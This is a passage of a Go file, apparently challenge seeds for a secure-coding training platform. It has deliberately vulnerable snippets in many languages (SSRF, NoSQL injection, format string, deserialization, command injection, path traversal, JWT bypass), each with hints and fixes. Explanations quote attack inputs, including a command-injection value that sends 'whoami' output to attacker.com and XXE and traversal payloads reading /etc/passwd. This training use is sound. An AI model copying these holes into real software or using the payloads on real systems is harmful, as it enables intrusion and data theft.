		targetVuln:    "The XmlDocument is instantiated with XmlResolver set to XmlUrlResolver, which resolves external entities. This allows XML External Entity (XXE) attacks where an attacker sends XML containing a DOCTYPE with external ENTITY declarations (e.g., <!ENTITY xxe SYSTEM \"file:///etc/passwd\">) to read local files, perform SSRF, or trigger denial of service via recursive entity expansion (Billion Laughs).",
		conceptualFix: "Set XmlResolver to null and disable DTD processing: xmlDoc.XmlResolver = null; and use XmlReaderSettings with DtdProcessing = DtdProcessing.Prohibit. Alternatively, switch to a safer XML parser like XDocument with default settings which disallows DTD processing by default in .NET Core.",
	}
}

// ──────────────────────────────────────────────────
// Go SSRF — Internal Service Access
// ──────────────────────────────────────────────────
func cveGoSSRF() challengeSeed {
	return challengeSeed{
		title:      "Go SSRF — Internal Service Metadata Access",
		slug:       "go-ssrf-internal",
		difficulty: 4,
		langSlug:   "go",
		catSlug:    "ssrf",
		points:     200,
		description: "This Go webhook delivery service accepts a user-supplied URL and makes an HTTP request to it. There is no validation to prevent requests to internal networks, cloud metadata endpoints, or localhost — allowing an attacker to probe internal infrastructure, steal cloud credentials, or access admin panels.",
		hints: []string{
			"Look at what validation is done on the target URL before the HTTP request.",
			"Can the user specify URLs pointing to localhost, 169.254.169.254, or internal IPs?",
			"The http.Get() call follows redirects — even if the initial URL looks safe, a redirect could go to an internal address.",
		},
		vulnerableLines: []int{29, 30, 31, 32, 33, 34, 35},
		code: `package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"
)

type WebhookRequest struct {
	URL     string            ` + "`json:\"url\"`" + `
	Method  string            ` + "`json:\"method\"`" + `
	Headers map[string]string ` + "`json:\"headers\"`" + `
	Body    string            ` + "`json:\"body\"`" + `
}

func webhookHandler(w http.ResponseWriter, r *http.Request) {
	var req WebhookRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", 400)
		return
	}

	// "Validate" the URL — only checks it is parseable, not where it points
	if _, err := url.Parse(req.URL); err != nil {
		http.Error(w, "Invalid URL", 400)
		return
	}

	// BUG: No SSRF protection — fetches any URL including internal/metadata
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(req.URL)
	if err != nil {
		http.Error(w, fmt.Sprintf("Request failed: %v", err), 502)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  resp.StatusCode,
		"headers": resp.Header,
		"body":    string(body),
	})
}

func main() {
	http.HandleFunc("/api/webhook/test", webhookHandler)
	http.ListenAndServe(":8080", nil)
}`,
		targetVuln:    "The webhook handler accepts any user-supplied URL and makes an HTTP request to it without validating the target host. An attacker can supply URLs like http://169.254.169.254/latest/meta-data/ (AWS metadata), http://localhost:8080/admin, or http://10.0.0.1/internal-api to access internal services, steal cloud credentials, or scan internal networks. The url.Parse() check only validates syntax, not the destination.",
		conceptualFix: "Implement a URL allowlist or blocklist that rejects requests to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16), link-local addresses, and cloud metadata IPs. Resolve the hostname before making the request and check the resolved IP. Disable HTTP redirects or re-validate after each redirect. Use a dedicated egress proxy for outbound webhook requests.",
	}
}

// ──────────────────────────────────────────────────
// MongoDB NoSQL Injection
// ──────────────────────────────────────────────────
func cveNoSQLInjection() challengeSeed {
	return challengeSeed{
		title:      "MongoDB NoSQL Injection — Query Operator Abuse",
		slug:       "nodejs-nosql-injection",
		difficulty: 4,
		langSlug:   "nodejs",
		catSlug:    "injection",
		points:     200,
		description: "This Express.js authentication endpoint passes user-supplied JSON directly into a MongoDB query. Because Express parses JSON request bodies, an attacker can send query operators like {\"$gt\": \"\"} as the password field to bypass authentication without knowing valid credentials.",
		hints: []string{
			"Look at how req.body.password is used in the MongoDB query.",
			"What happens if password is an object like {\"$gt\": \"\"} instead of a string?",
			"MongoDB query operators in user input can alter the query logic.",
		},
		vulnerableLines: []int{21, 22, 23, 24, 25},
		code: `const express = require('express');
const { MongoClient } = require('mongodb');
const bcrypt = require('bcrypt');

const app = express();
app.use(express.json());

let db;
MongoClient.connect('mongodb://localhost:27017')
  .then(client => { db = client.db('myapp'); });

app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing credentials' });
  }

  try {
    /* BUG: If password is an object like {"$gt": ""},
       MongoDB interprets it as a query operator,
       matching any document where password_hash > "" (always true). */
    const user = await db.collection('users').findOne({
      username: username,
      password_hash: password
    });

    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = generateToken(user);
    res.json({ status: 'success', token });
  } catch (err) {
    res.status(500).json({ error: 'Internal error' });
  }
});

app.get('/api/users/search', async (req, res) => {
  const { name, role } = req.query;
  const filter = {};
  if (name) filter.name = name;
  if (role) filter.role = role;

  const users = await db.collection('users')
    .find(filter)
    .project({ password_hash: 0 })
    .limit(50)
    .toArray();
  res.json(users);
});

function generateToken(user) {
  return Buffer.from(JSON.stringify({
    id: user._id, username: user.username, role: user.role
  })).toString('base64');
}

app.listen(3000);`,
		targetVuln:    "User-supplied JSON values from req.body are passed directly into MongoDB's findOne() query without type validation. An attacker can send {\"username\": \"admin\", \"password\": {\"$gt\": \"\"}} which causes MongoDB to interpret the password field as a query operator ($gt matches any value greater than empty string), bypassing password verification entirely.",
		conceptualFix: "Validate that username and password are strings before using them in queries: if (typeof username !== 'string' || typeof password !== 'string') return error. Use a separate password verification step: first find the user by username only, then compare the password using bcrypt.compare(). Never pass raw user input as MongoDB query values — use a schema validator or sanitize inputs.",
	}
}

// ──────────────────────────────────────────────────
// C Format String Vulnerability
// ──────────────────────────────────────────────────
func cveCFormatString() challengeSeed {
	return challengeSeed{
		title:      "C Format String — Log Message Exploitation",
		slug:       "c-format-string",
		difficulty: 6,
		langSlug:   "c",
		catSlug:    "memory-corruption",
		points:     300,
		description: "This logging daemon accepts syslog messages over UDP and writes them to a log file. The message content is passed directly as the format string argument to fprintf() and syslog(), allowing an attacker to read from the stack with %x specifiers, crash the process with %n, or achieve arbitrary memory writes.",
		hints: []string{
			"Look at the fprintf() and syslog() calls — how many arguments do they take?",
			"What happens when a string containing %x or %n is used as a printf format string?",
			"The message from the network is used directly as the first argument to fprintf().",
		},
		vulnerableLines: []int{37, 42},
		code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SYSLOG_PORT 514
#define MAX_MSG_SIZE 2048
#define LOG_FILE "/var/log/custom_syslog.log"

void get_timestamp(char *buf, size_t len) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buf, len, "%Y-%m-%d %H:%M:%S", t);
}

void log_message(const char *source_ip, const char *message) {
    char timestamp[64];
    get_timestamp(timestamp, sizeof(timestamp));

    FILE *logfile = fopen(LOG_FILE, "a");
    if (!logfile) {
        perror("Failed to open log file");
        return;
    }

    /* Write timestamp and source */
    fprintf(logfile, "[%s] %s: ", timestamp, source_ip);

    /* BUG: Format string vulnerability — message is used directly
       as the format string. If it contains %x, %s, %n etc.,
       fprintf will read from/write to the stack. */
    fprintf(logfile, message);
    fprintf(logfile, "\n");
    fclose(logfile);

    /* Same bug in syslog — message is the format string */
    openlog("custom_syslog", LOG_PID, LOG_LOCAL0);
    syslog(LOG_INFO, message);
    closelog();
}

int main(void) {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    char buffer[MAX_MSG_SIZE];
    socklen_t client_len = sizeof(client_addr);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(SYSLOG_PORT);

    bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    printf("Syslog daemon listening on port %d\n", SYSLOG_PORT);

    while (1) {
        int n = recvfrom(sockfd, buffer, MAX_MSG_SIZE - 1, 0,
                         (struct sockaddr *)&client_addr, &client_len);
        if (n > 0) {
            buffer[n] = '\0';
            char *client_ip = inet_ntoa(client_addr.sin_addr);
            log_message(client_ip, buffer);
        }
    }
    return 0;
}`,
		targetVuln:    "The user-controlled message string from the network is passed directly as the format string argument to fprintf() and syslog(). An attacker can send messages containing format specifiers like %x (leak stack data), %s (read arbitrary memory), or %n (write to arbitrary memory addresses). This can lead to information disclosure, denial of service, or arbitrary code execution.",
		conceptualFix: "Never use user-controlled data as a format string. Always use a fixed format string with the message as a data argument: fprintf(logfile, \"%s\", message) and syslog(LOG_INFO, \"%s\", message). This treats the message as data, not as format instructions.",
	}
}

// ──────────────────────────────────────────────────
// C++ Use-After-Free via vector reallocation
// ──────────────────────────────────────────────────
func cveCppUAFVector() challengeSeed {
	return challengeSeed{
		title:      "C++ Use-After-Free — Vector Iterator Invalidation",
		slug:       "cpp-uaf-vector",
		difficulty: 7,
		langSlug:   "cpp",
		catSlug:    "memory-corruption",
		points:     350,
		description: "This C++ session manager stores active sessions in a std::vector and returns references to session objects. When new sessions are added, the vector may reallocate its internal buffer, invalidating all existing references and pointers — leading to use-after-free when the original reference is subsequently accessed.",
		hints: []string{
			"Look at what happens when the sessions vector grows beyond its capacity.",
			"std::vector may reallocate when push_back is called — what happens to existing references?",
			"The 'session' reference on line 43 may become dangling after add_session modifies the vector.",
		},
		vulnerableLines: []int{27, 28, 43, 44, 45, 46, 47},
		code: `#include <iostream>
#include <vector>
#include <string>
#include <ctime>

struct Session {
    std::string session_id;
    std::string username;
    time_t created_at;
    time_t last_active;
    bool is_valid;
    std::string data;
};

class SessionManager {
public:
    SessionManager() {
        sessions_.reserve(2); // Small initial capacity for demonstration
    }

    /* Returns a reference to the newly created session.
       WARNING: This reference is invalidated if the vector reallocates. */
    Session& create_session(const std::string& username) {
        Session s;
        s.session_id = generate_id();
        s.username = username;
        s.created_at = time(nullptr);
        s.last_active = s.created_at;
        s.is_valid = true;
        sessions_.push_back(s);
        return sessions_.back();
    }

    void add_session(const Session& s) {
        sessions_.push_back(s);
    }

    size_t count() const { return sessions_.size(); }

private:
    std::vector<Session> sessions_;
    std::string generate_id() { return "sess_" + std::to_string(rand()); }
};

int main() {
    SessionManager manager;

    /* Create a session and keep a reference to it */
    Session& session = manager.create_session("alice");
    std::cout << "Created: " << session.session_id << std::endl;

    /* Add more sessions — this may cause vector reallocation,
       invalidating the 'session' reference above */
    for (int i = 0; i < 10; i++) {
        Session s;
        s.session_id = "bulk_" + std::to_string(i);
        s.username = "user_" + std::to_string(i);
        s.is_valid = true;
        manager.add_session(s);
    }

    /* BUG: Use-after-free — 'session' reference is now dangling
       because the vector reallocated its internal buffer */
    std::cout << "Session user: " << session.username << std::endl;
    session.last_active = time(nullptr);
    session.data = "updated payload";

    return 0;
}`,
		targetVuln:    "The create_session() method returns a reference to an element inside a std::vector. When subsequent push_back() calls exceed the vector's capacity, the vector reallocates its internal buffer and moves all elements to a new memory location. The previously returned reference now points to freed memory (dangling reference), and accessing it is undefined behavior — a use-after-free vulnerability.",
		conceptualFix: "Never store or return references/pointers/iterators to vector elements if the vector may grow. Use stable containers like std::list or std::deque, or return indices instead of references. Alternatively, use std::vector<std::unique_ptr<Session>> so that pointers to Session objects remain stable across reallocations. Another approach is to reserve sufficient capacity upfront if the maximum size is known.",
	}
}

// ──────────────────────────────────────────────────
// CVE-2015-7501: Java Deserialization Gadget Chain
// ──────────────────────────────────────────────────
func cveJavaDeserGadget() challengeSeed {
	return challengeSeed{
		title:      "Java Deserialization — Apache Commons Gadget Chain",
		slug:       "java-deser-gadget",
		difficulty: 8,
		langSlug:   "java",
		catSlug:    "insecure-deser",
		points:     400,
		cveReference: "CVE-2015-7501",
		description: "This Java RMI service accepts serialized Java objects over the network for inter-service communication. It uses ObjectInputStream.readObject() on untrusted data without any class filtering. Combined with Apache Commons Collections on the classpath, an attacker can construct a gadget chain payload that executes arbitrary commands on deserialization.",
		hints: []string{
			"Look at how incoming data is deserialized — is there any class filtering?",
			"ObjectInputStream.readObject() will instantiate any Serializable class on the classpath.",
			"Research 'Apache Commons Collections gadget chain' and how it enables RCE via deserialization.",
		},
		vulnerableLines: []int{36, 37, 38, 39, 40, 41},
		code: `import java.io.*;
import java.net.*;
import java.util.logging.Logger;

public class TaskService {

    private static final Logger logger = Logger.getLogger(TaskService.class.getName());
    private static final int PORT = 9090;

    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket(PORT);
        logger.info("TaskService listening on port " + PORT);

        while (true) {
            try (Socket clientSocket = serverSocket.accept()) {
                handleClient(clientSocket);
            } catch (Exception e) {
                logger.warning("Error handling client: " + e.getMessage());
            }
        }
    }

    private static void handleClient(Socket socket) throws IOException {
        logger.info("Connection from: " + socket.getRemoteSocketAddress());

        InputStream in = socket.getInputStream();
        OutputStream out = socket.getOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(out);

        try {
            /* Read the command type */
            DataInputStream dis = new DataInputStream(in);
            String commandType = dis.readUTF();

            /* BUG: Deserialize arbitrary objects from untrusted network input.
               No class filtering, no allowlist — any Serializable class
               on the classpath can be instantiated, enabling gadget chains. */
            ObjectInputStream ois = new ObjectInputStream(in);
            Object taskData = ois.readObject();

            logger.info("Received " + commandType + " task: " + taskData.getClass().getName());

            /* Process the task based on type */
            Object result = processTask(commandType, taskData);
            oos.writeObject(result);
            oos.flush();

        } catch (ClassNotFoundException e) {
            logger.warning("Unknown class in deserialization: " + e.getMessage());
            oos.writeObject(new TaskResult("error", "Unknown class"));
            oos.flush();
        }
    }

    private static Object processTask(String type, Object data) {
        return new TaskResult("ok", "Processed: " + type);
    }
}

class TaskResult implements Serializable {
    private static final long serialVersionUID = 1L;
    public String status;
    public String message;
    TaskResult(String s, String m) { this.status = s; this.message = m; }
}`,
		targetVuln:    "The service uses ObjectInputStream.readObject() to deserialize arbitrary objects from an untrusted network connection with no class filtering or allowlist. With libraries like Apache Commons Collections on the classpath, an attacker can send a crafted serialized object (gadget chain) that triggers arbitrary command execution during deserialization — before the application code even inspects the deserialized object.",
		conceptualFix: "Implement a deserialization filter using ObjectInputFilter (Java 9+) or a custom ObjectInputStream that overrides resolveClass() to allowlist only expected classes. Better yet, replace Java native serialization with a structured format like JSON or Protocol Buffers for inter-service communication. Remove unused libraries (like Commons Collections) from the classpath to reduce the gadget chain attack surface.",
	}
}

// ──────────────────────────────────────────────────
// Python subprocess Command Injection
// ──────────────────────────────────────────────────
func cvePythonCmdInjection() challengeSeed {
	return challengeSeed{
		title:      "Python subprocess — Shell Command Injection",
		slug:       "python-cmd-injection",
		difficulty: 3,
		langSlug:   "python",
		catSlug:    "cmd-injection",
		points:     150,
		description: "This network diagnostic API allows users to ping a specified host. It constructs a shell command by concatenating user input directly into the command string and passes it to subprocess.Popen with shell=True, allowing an attacker to inject additional shell commands using metacharacters like ; or &&.",
		hints: []string{
			"Look at how the ping command is constructed.",
			"What happens when the hostname contains shell metacharacters like ';' or '&&'?",
			"The shell=True argument means the command string is interpreted by /bin/sh.",
		},
		vulnerableLines: []int{19, 20, 21, 22},
		code: `from flask import Flask, request, jsonify
import subprocess
import re

app = Flask(__name__)

@app.route("/api/tools/ping", methods=["POST"])
def ping_host():
    data = request.get_json()
    host = data.get("host", "")

    if not host:
        return jsonify({"error": "Host is required"}), 400

    # Basic length check
    if len(host) > 255:
        return jsonify({"error": "Host too long"}), 400

    # BUG: User input concatenated directly into shell command
    cmd = f"ping -c 4 -W 2 {host}"
    try:
        result = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, timeout=10
        )
        stdout, stderr = result.communicate(timeout=10)
        return jsonify({
            "host": host,
            "output": stdout.decode("utf-8", errors="replace"),
            "error": stderr.decode("utf-8", errors="replace"),
            "exit_code": result.returncode,
        })
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Ping timed out"}), 504
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/dns", methods=["POST"])
def dns_lookup():
    data = request.get_json()
    host = data.get("host", "")
    record_type = data.get("type", "A")

    cmd = f"dig {record_type} {host} +short"
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=10
        )
        return jsonify({"host": host, "type": record_type, "result": result.stdout})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)`,
		targetVuln:    "User-supplied hostname is concatenated directly into shell command strings and executed via subprocess with shell=True. An attacker can inject commands like '8.8.8.8; cat /etc/passwd' or '8.8.8.8 && curl attacker.com/exfil?data=$(whoami)'. Both the /ping and /dns endpoints are vulnerable to the same pattern.",
		conceptualFix: "Use subprocess with shell=False and pass arguments as a list: subprocess.run(['ping', '-c', '4', '-W', '2', host], ...). This prevents shell metacharacter interpretation. Additionally, validate the host parameter against a strict regex (hostname or IP format only) and reject any input containing shell metacharacters.",
	}
}

// ──────────────────────────────────────────────────
// PHP Local File Inclusion
// ──────────────────────────────────────────────────
func cvePHPFileInclusion() challengeSeed {
	return challengeSeed{
		title:      "PHP Local File Inclusion — Template Loader",
		slug:       "php-file-inclusion",
		difficulty: 4,
		langSlug:   "php",
		catSlug:    "broken-access",
		points:     200,
		description: "This PHP page loader uses a 'page' parameter to include template files dynamically. The sanitization only strips '../' sequences but doesn't handle encoded or alternative traversal techniques, allowing an attacker to read arbitrary files from the server filesystem via path traversal.",
		hints: []string{
			"Look at how the 'page' parameter is sanitized — what traversal patterns does it miss?",
			"What about double-encoding, URL encoding, or null bytes in the path?",
			"The str_replace only catches literal '../' — what about '..\\' or '....//`?",
		},
		vulnerableLines: []int{18, 19, 20, 21, 25},
		code: `<?php
session_start();

$base_dir = '/var/www/app/templates/';
$allowed_extensions = ['php', 'html'];

function load_page(string $base_dir, array $allowed_extensions): void {
    $page = $_GET['page'] ?? 'home';

    // Strip null bytes
    $page = str_replace("\0", '', $page);

    // Check extension
    $ext = pathinfo($page, PATHINFO_EXTENSION);
    if (empty($ext)) {
        $page .= '.php';
    }

    // BUG: Incomplete path traversal sanitization.
    // Only removes literal '../' — misses '....//','..\\', encoded variants
    $page = str_replace('../', '', $page);

    $filepath = $base_dir . $page;

    // Check extension after path construction
    $final_ext = pathinfo($filepath, PATHINFO_EXTENSION);
    if (!in_array($final_ext, $allowed_extensions)) {
        http_response_code(403);
        echo "Forbidden: invalid file type";
        return;
    }

    if (file_exists($filepath)) {
        include($filepath);
    } else {
        http_response_code(404);
        include($base_dir . '404.php');
    }
}

load_page($base_dir, $allowed_extensions);`,
		targetVuln:    "The path traversal sanitization uses a single str_replace('../', '', $page) which can be bypassed with nested sequences like '....//'. After str_replace removes the inner '../', the remaining characters form '../' again. This allows reading arbitrary .php and .html files from the filesystem. Additionally, on some PHP configurations, null byte injection or wrapper protocols (php://filter) could bypass the extension check.",
		conceptualFix: "Use realpath() to resolve the full path and then verify it starts with the expected base directory: $real = realpath($filepath); if (strpos($real, realpath($base_dir)) !== 0) { deny; }. This catches all traversal variants regardless of encoding. Alternatively, use a whitelist of allowed page names instead of constructing file paths from user input.",
	}
}

// ──────────────────────────────────────────────────
// Rust Race Condition via Arc without proper sync
// ──────────────────────────────────────────────────
func cveRustRaceCondition() challengeSeed {
	return challengeSeed{
		title:      "Rust Race Condition — Token Balance Double-Spend",
		slug:       "rust-race-condition",
		difficulty: 6,
		langSlug:   "rust",
		catSlug:    "race-condition",
		points:     300,
		description: "This Rust token transfer service uses Arc<Mutex<>> for the account map but releases the lock between the balance check and the balance update. This TOCTOU (Time-of-Check-Time-of-Use) gap allows concurrent requests to double-spend tokens by reading the same balance before either write completes.",
		hints: []string{
			"Look at the transfer function — how many times is the mutex locked and unlocked?",
			"Is the balance check and the balance update performed while holding the same lock?",
			"What happens if two transfers from the same account execute the balance check simultaneously?",
		},
		vulnerableLines: []int{30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42},
		code: `use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::thread;

type AccountMap = Arc<Mutex<HashMap<String, i64>>>;

fn create_accounts() -> AccountMap {
    let mut accounts = HashMap::new();
    accounts.insert("alice".to_string(), 1000);
    accounts.insert("bob".to_string(), 500);
    accounts.insert("charlie".to_string(), 200);
    Arc::new(Mutex::new(accounts))
}

fn get_balance(accounts: &AccountMap, user: &str) -> Option<i64> {
    let map = accounts.lock().unwrap();
    map.get(user).copied()
}

fn set_balance(accounts: &AccountMap, user: &str, amount: i64) {
    let mut map = accounts.lock().unwrap();
    map.insert(user.to_string(), amount);
}

/* BUG: TOCTOU race condition — the lock is released between
   checking the balance and updating it. Two concurrent transfers
   can both see sufficient balance and both succeed, overdrawing. */
fn transfer(accounts: &AccountMap, from: &str, to: &str, amount: i64)
    -> Result<(), String>
{
    // Check sender balance (acquires and releases lock)
    let sender_balance = get_balance(accounts, from)
        .ok_or_else(|| format!("Account {} not found", from))?;

    if sender_balance < amount {
        return Err(format!("Insufficient balance: {} < {}", sender_balance, amount));
    }

    // Check receiver exists (acquires and releases lock)
    let receiver_balance = get_balance(accounts, to)
        .ok_or_else(|| format!("Account {} not found", to))?;

    // Update balances (each acquires and releases lock separately)
    set_balance(accounts, from, sender_balance - amount);
    set_balance(accounts, to, receiver_balance + amount);

    Ok(())
}

fn main() {
    let accounts = create_accounts();

    let mut handles = vec![];
    // Spawn 10 concurrent transfers of 200 from alice (balance: 1000)
    for i in 0..10 {
        let acc = accounts.clone();
        handles.push(thread::spawn(move || {
            match transfer(&acc, "alice", "bob", 200) {
                Ok(()) => println!("Transfer {} succeeded", i),
                Err(e) => println!("Transfer {} failed: {}", i, e),
            }
        }));
    }

    for h in handles { h.join().unwrap(); }

    let final_balance = get_balance(&accounts, "alice").unwrap();
    println!("Alice final balance: {} (should be >= 0)", final_balance);
}`,
		targetVuln:    "The transfer function has a TOCTOU (Time-of-Check-Time-of-Use) race condition. It calls get_balance() which acquires and releases the mutex, then checks the balance, then calls set_balance() which acquires the mutex again. Between the check and the update, another thread can read the same balance and also pass the check. This allows double-spending: 10 concurrent transfers of 200 from a 1000-balance account can all succeed, resulting in a negative balance of -1000.",
		conceptualFix: "Hold the mutex lock for the entire transfer operation — check balance and update balance within a single critical section. Lock the accounts map once, perform the balance check and both updates, then release: let mut map = accounts.lock().unwrap(); check and modify map within this scope. This ensures atomicity of the entire transfer.",
	}
}

// ──────────────────────────────────────────────────
// JWT Algorithm None Bypass
// ──────────────────────────────────────────────────
func cveJWTNoneBypass() challengeSeed {
	return challengeSeed{
		title:      "JWT Algorithm None — Authentication Bypass",
		slug:       "nodejs-jwt-none",
		difficulty: 5,
		langSlug:   "nodejs",
		catSlug:    "auth-bypass",
		points:     250,
		description: "This Express.js middleware verifies JWT tokens but uses a configuration that doesn't explicitly restrict the allowed algorithms. An attacker can forge a valid-looking token with the 'alg' header set to 'none' (no signature required), bypassing authentication entirely without knowing the secret key.",
		hints: []string{
			"Look at the jwt.verify() options — is the algorithms list restricted?",
			"What happens if the JWT header specifies 'alg': 'none'?",
			"Some JWT libraries accept 'none' as a valid algorithm if not explicitly excluded.",
		},
		vulnerableLines: []int{18, 19, 20},
		code: `const express = require('express');
const jwt = require('jsonwebtoken');

const app = express();
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-key-change-in-prod';

/* Generate a token for authenticated users */
function generateToken(user) {
  return jwt.sign(
    { sub: user.id, username: user.username, role: user.role },
    JWT_SECRET,
    { expiresIn: '24h', algorithm: 'HS256' }
  );
}

/* BUG: jwt.verify without specifying allowed algorithms.
   Some libraries accept 'alg: none' tokens when algorithms
   are not restricted, bypassing signature verification entirely. */
function verifyToken(token) {
  return jwt.verify(token, JWT_SECRET);
}

/* Auth middleware */
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.slice(7);
  try {
    const decoded = verifyToken(token);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

/* Admin middleware */
function adminOnly(req, res, next) {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }
  next();
}

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  const user = authenticateUser(username, password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  const token = generateToken(user);
  res.json({ token });
});

app.get('/api/profile', authMiddleware, (req, res) => {
  res.json({ user: req.user });
});

app.get('/api/admin/users', authMiddleware, adminOnly, (req, res) => {
  res.json({ users: getAllUsers() });
});

function authenticateUser(u, p) { return null; }
function getAllUsers() { return []; }

app.listen(3000);`,
		targetVuln:    "The jwt.verify() call doesn't specify an 'algorithms' option to restrict which signing algorithms are accepted. Depending on the library version, an attacker can craft a JWT with {\"alg\": \"none\"} in the header and an empty signature, which some libraries accept as valid — completely bypassing signature verification. The attacker can then set any claims (e.g., role: 'admin') in the forged token.",
		conceptualFix: "Always specify the allowed algorithms in jwt.verify(): jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] }). This explicitly rejects tokens with 'alg: none' or unexpected algorithms (like RS256 used in key confusion attacks). Additionally, ensure the JWT library version is up-to-date and handles 'none' algorithm safely by default.",
	}
}

// ──────────────────────────────────────────────────
// Go Path Traversal — File Download
// ──────────────────────────────────────────────────
func cveGoPathTraversal() challengeSeed {
	return challengeSeed{
		title:      "Go Path Traversal — Arbitrary File Download",
		slug:       "go-path-traversal",
		difficulty: 4,
		langSlug:   "go",
		catSlug:    "broken-access",
		points:     200,
		description: "This Go file server serves user-uploaded documents from a designated directory. It takes a filename from the URL path and joins it with the base directory using filepath.Join(). However, filepath.Join() does not prevent path traversal — an attacker can use '../' sequences to escape the upload directory and download arbitrary files like /etc/passwd.",
		hints: []string{
			"Look at how the filename is used to construct the file path.",
			"Does filepath.Join() prevent path traversal with '../' sequences?",
			"What validation ensures the resolved path stays within the upload directory?",
		},
		vulnerableLines: []int{28, 29, 30, 31},
		code: `package main

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const uploadDir = "/var/www/uploads"

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	// Extract filename from URL: /api/files/download/{filename}
	filename := strings.TrimPrefix(r.URL.Path, "/api/files/download/")

	if filename == "" {
		http.Error(w, "Filename required", http.StatusBadRequest)
		return
	}

	// Basic extension check
	ext := filepath.Ext(filename)
	if ext == ".exe" || ext == ".sh" || ext == ".bat" {
		http.Error(w, "Forbidden file type", http.StatusForbidden)
		return
	}

	// BUG: filepath.Join does not prevent traversal.
	// "../../../etc/passwd" resolves to a path outside uploadDir.
	fullPath := filepath.Join(uploadDir, filename)

	info, err := os.Stat(fullPath)
	if err != nil || info.IsDir() {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	// Serve the file
	w.Header().Set("Content-Disposition",
		fmt.Sprintf("attachment; filename=\"%s\"", filepath.Base(fullPath)))
	http.ServeFile(w, r, fullPath)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(10 << 20) // 10 MB max
	file, handler, err := r.FormFile("document")
	if err != nil {
		http.Error(w, "Failed to read file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	destPath := filepath.Join(uploadDir, handler.Filename)
	dst, err := os.Create(destPath)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	fmt.Fprintf(w, "{\"status\": \"uploaded\", \"filename\": \"%s\"}", handler.Filename)
}

func main() {
	http.HandleFunc("/api/files/download/", downloadHandler)
	http.HandleFunc("/api/files/upload", uploadHandler)
	http.ListenAndServe(":8080", nil)
}`,
		targetVuln:    "filepath.Join(uploadDir, filename) does not prevent path traversal. If filename is '../../../etc/passwd', the resulting path escapes the upload directory. The extension check is also bypassable since /etc/passwd has no forbidden extension. The upload handler has the same vulnerability — an attacker can write files to arbitrary locations.",
		conceptualFix: "After constructing the full path, use filepath.Clean() and then verify the result starts with the base directory: cleaned := filepath.Clean(fullPath); if !strings.HasPrefix(cleaned, filepath.Clean(uploadDir) + string(os.PathSeparator)) { deny }. Alternatively, use filepath.Rel() and check that the relative path doesn't start with '..'.",
	}
}

// ──────────────────────────────────────────────────
// C# BinaryFormatter Deserialization RCE
// ──────────────────────────────────────────────────
func cveCSharpBinaryFormatter() challengeSeed {
	return challengeSeed{
		title:      "C# BinaryFormatter — Deserialization RCE",
		slug:       "csharp-deser-binaryformatter",
		difficulty: 7,
		langSlug:   "csharp",
		catSlug:    "insecure-deser",
		points:     350,
		description: "This .NET remoting service uses BinaryFormatter to deserialize session state received over the network. BinaryFormatter can instantiate arbitrary types during deserialization, allowing an attacker to send crafted payloads (using gadget chains from common .NET libraries) to execute arbitrary code on the server.",
		hints: []string{
			"Look at what deserializer is used for incoming network data.",
			"BinaryFormatter is known to be dangerous with untrusted data — why?",
			"Microsoft has explicitly deprecated BinaryFormatter due to deserialization vulnerabilities.",
		},
		vulnerableLines: []int{34, 35, 36, 37, 38},
		code: `using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading.Tasks;

namespace SessionService
{
    [Serializable]
    public class SessionData
    {
        public string SessionId { get; set; }
        public string UserId { get; set; }
        public DateTime CreatedAt { get; set; }
        public DateTime ExpiresAt { get; set; }
        public byte[] Payload { get; set; }
    }

    public class SessionServer
    {
        private readonly TcpListener _listener;

        public SessionServer(int port)
